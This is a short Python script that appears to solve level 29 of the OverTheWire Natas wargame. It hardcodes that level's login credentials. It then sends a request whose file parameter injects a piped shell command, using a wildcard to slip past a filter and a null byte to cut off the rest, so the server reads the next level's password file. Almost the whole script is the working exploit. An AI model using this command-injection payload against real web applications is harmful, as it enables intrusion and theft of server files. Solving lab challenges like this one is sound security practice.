#!/usr/bin/env_python

import requests


username = 'natas29'
password = 'airooCaiseiyee8he8xongien9euhe8b'

url = url = 'http://%s.natas.labs.overthewire.org/' %username
path = 'index.pl?file=|cat /etc/na?as_webpass/na?as30%00'
session = requests.session()

response = session.get(url + path, auth=(username, password))
content = response.text
print content